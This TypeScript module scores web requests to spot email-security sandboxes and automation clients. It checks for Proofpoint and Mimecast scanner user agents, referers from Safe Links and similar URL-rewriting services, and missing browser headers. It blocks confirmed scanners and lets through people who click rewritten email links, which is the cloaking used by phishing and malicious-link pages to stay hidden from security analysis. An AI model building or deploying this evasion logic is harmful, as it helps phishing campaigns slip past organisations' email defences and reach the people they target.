/**
 * Smart Sandbox Detection - Multi-Factor Analysis
 * Only blocks CONFIRMED sandboxes, allows real users through security relays
 */

export interface SmartDetectionResult {
  isSandbox: boolean
  confidence: number // 0-100
  reasons: string[]
  allowReason?: string
  riskLevel: 'low' | 'medium' | 'high' | 'critical'
  sandboxScore: number
  realUserScore: number
}

export async function smartDetectSandbox(
  request: Request
): Promise<SmartDetectionResult> {
  const reasons: string[] = []
  let sandboxScore = 0
  let realUserScore = 0

  // Extract all signals
  const ua = request.headers.get('user-agent') || ''
  const referer = request.headers.get('referer') || ''
  const acceptLanguage = request.headers.get('accept-language') || ''
  const acceptEncoding = request.headers.get('accept-encoding') || ''
  const accept = request.headers.get('accept') || ''

  // === FACTOR 1: USER-AGENT ANALYSIS ===
  const uaAnalysis = analyzeUserAgentSmart(ua)
  sandboxScore += uaAnalysis.sandboxScore
  realUserScore += uaAnalysis.realUserScore
  reasons.push(...uaAnalysis.reasons)

  // === FACTOR 2: REFERER ANALYSIS ===
  // Proofpoint referer ALONE is not enough - many real users have this!
  const refererAnalysis = analyzeRefererSmart(referer, ua)
  sandboxScore += refererAnalysis.sandboxScore
  realUserScore += refererAnalysis.realUserScore
  reasons.push(...refererAnalysis.reasons)

  // === FACTOR 3: HEADER COMPLETENESS ===
  const headerAnalysis = analyzeHeadersSmart({
    acceptLanguage,
    acceptEncoding,
    accept,
  })
  sandboxScore += headerAnalysis.sandboxScore
  realUserScore += headerAnalysis.realUserScore
  reasons.push(...headerAnalysis.reasons)

  // === DECISION LOGIC ===
  // If real user score is high, ALLOW even if sandbox score is present
  if (realUserScore >= 50 && sandboxScore < realUserScore) {
    return {
      isSandbox: false,
      confidence: realUserScore,
      reasons: ['Real browser signatures detected'],
      allowReason: 'High confidence real user',
      riskLevel: 'low',
      sandboxScore,
      realUserScore,
    }
  }

  // If sandbox score is very high AND real user score is low, BLOCK
  if (sandboxScore >= 80 && sandboxScore > realUserScore) {
    return {
      isSandbox: true,
      confidence: sandboxScore,
      reasons,
      riskLevel: 'critical',
      sandboxScore,
      realUserScore,
    }
  }

  // If sandbox score is moderate, need more analysis (Layer 4)
  if (sandboxScore >= 50 && sandboxScore < 80) {
    return {
      isSandbox: false, // Let through to Layer 4 for behavioral analysis
      confidence: sandboxScore,
      reasons: ['Requires behavioral verification'],
      allowReason: 'Needs Layer 4 behavioral check',
      riskLevel: 'medium',
      sandboxScore,
      realUserScore,
    }
  }

  // Default: Allow (fail open for legitimate users)
  return {
    isSandbox: false,
    confidence: 10,
    reasons: ['Insufficient evidence for blocking'],
    allowReason: 'Default allow to avoid false positives',
    riskLevel: 'low',
    sandboxScore,
    realUserScore,
  }
}

// === SMART ANALYSIS FUNCTIONS ===

function analyzeUserAgentSmart(ua: string): {
  sandboxScore: number
  realUserScore: number
  reasons: string[]
} {
  const reasons: string[] = []
  let sandboxScore = 0
  let realUserScore = 0

  if (!ua || ua.length < 10) {
    reasons.push('Missing or too short user agent')
    sandboxScore += 30
    return { sandboxScore, realUserScore, reasons }
  }

  const uaLower = ua.toLowerCase()

  // STRONG sandbox indicators (very specific)
  const strongSandboxPatterns = [
    'proofpointsandbox',
    'mimecastscanner',
    'sandbox',
    'headless',
    'phantomjs',
    'selenium',
    'webdriver',
    'puppeteer',
    'playwright',
    'curl',
    'wget',
    'python-requests',
    'python-urllib',
    'java',
    'go-http-client',
    'axios',
    'node-fetch',
    'httpclient',
    'apache-httpclient',
    'okhttp',
  ]

  for (const pattern of strongSandboxPatterns) {
    if (uaLower.includes(pattern)) {
      reasons.push(`Automation tool detected: ${pattern}`)
      sandboxScore += 50
      break
    }
  }

  // WEAK sandbox indicators (generic, needs other factors)
  const weakSandboxPatterns = ['bot', 'crawler', 'spider', 'scanner']

  for (const pattern of weakSandboxPatterns) {
    if (uaLower.includes(pattern)) {
      reasons.push(`Generic automation keyword: ${pattern}`)
      sandboxScore += 15
      break
    }
  }

  // REAL USER indicators
  const realBrowserPatterns = [
    'mozilla/5.0',
    'chrome/',
    'safari/',
    'firefox/',
    'edge/',
    'opera/',
  ]

  let hasRealBrowser = false
  for (const pattern of realBrowserPatterns) {
    if (uaLower.includes(pattern)) {
      hasRealBrowser = true
      break
    }
  }

  if (hasRealBrowser) {
    realUserScore += 30
    reasons.push('Real browser User-Agent detected')

    // Check for browser version (sandboxes often have generic versions)
    if (
      /chrome\/\d{2,3}\./.test(uaLower) ||
      /firefox\/\d{2,3}\./.test(uaLower) ||
      /safari\/\d{3,4}/.test(uaLower)
    ) {
      realUserScore += 10
      reasons.push('Specific browser version present')
    }

    // Check for mobile browser indicators (real users)
    if (
      uaLower.includes('mobile') ||
      uaLower.includes('android') ||
      uaLower.includes('iphone') ||
      uaLower.includes('ipad')
    ) {
      realUserScore += 10
      reasons.push('Mobile device detected')
    }
  }

  return { sandboxScore, realUserScore, reasons }
}

function analyzeRefererSmart(
  referer: string,
  ua: string
): {
  sandboxScore: number
  realUserScore: number
  reasons: string[]
} {
  const reasons: string[] = []
  let sandboxScore = 0
  let realUserScore = 0

  if (!referer) {
    // No referer is actually normal for email clicks
    return { sandboxScore: 0, realUserScore: 0, reasons: [] }
  }

  const refererLower = referer.toLowerCase()
  const uaLower = ua.toLowerCase()

  // URL rewriting services
  const urlRewritingServices = [
    'urldefense.proofpoint.com',
    'protection.outlook.com',
    'safelinks.protection.outlook.com',
    'mimecast.com',
    'barracudanetworks.com',
    'forcepoint.com',
  ]

  let hasUrlRewriting = false
  let rewritingService = ''

  for (const service of urlRewritingServices) {
    if (refererLower.includes(service)) {
      hasUrlRewriting = true
      rewritingService = service
      break
    }
  }

  if (hasUrlRewriting) {
    // Check if this is a REAL USER or SANDBOX

    // If UA looks like real browser, it's probably a real user clicking through
    if (
      uaLower.includes('mozilla/5.0') &&
      (uaLower.includes('chrome') ||
        uaLower.includes('safari') ||
        uaLower.includes('firefox') ||
        uaLower.includes('edge'))
    ) {
      realUserScore += 20
      reasons.push(`Real user clicking through ${rewritingService}`)
    } else {
      // Generic UA + URL rewriting = likely sandbox
      sandboxScore += 30
      reasons.push(`Sandbox scanning through ${rewritingService}`)
    }
  }

  return { sandboxScore, realUserScore, reasons }
}

function analyzeHeadersSmart(headers: {
  acceptLanguage: string
  acceptEncoding: string
  accept: string
}): {
  sandboxScore: number
  realUserScore: number
  reasons: string[]
} {
  const reasons: string[] = []
  let sandboxScore = 0
  let realUserScore = 0

  // Real browsers ALWAYS send these headers
  if (headers.acceptLanguage) {
    realUserScore += 10
    reasons.push('Accept-Language header present')
  } else {
    sandboxScore += 15
    reasons.push('Missing Accept-Language header')
  }

  if (headers.acceptEncoding) {
    realUserScore += 10
    reasons.push('Accept-Encoding header present')
  } else {
    sandboxScore += 15
    reasons.push('Missing Accept-Encoding header')
  }

  // Real browsers send "text/html" in Accept header
  if (headers.accept && headers.accept.includes('text/html')) {
    realUserScore += 10
    reasons.push('Browser-like Accept header')
  } else if (headers.accept) {
    sandboxScore += 10
    reasons.push('Non-browser Accept header')
  } else {
    sandboxScore += 15
    reasons.push('Missing Accept header')
  }

  return { sandboxScore, realUserScore, reasons }
}

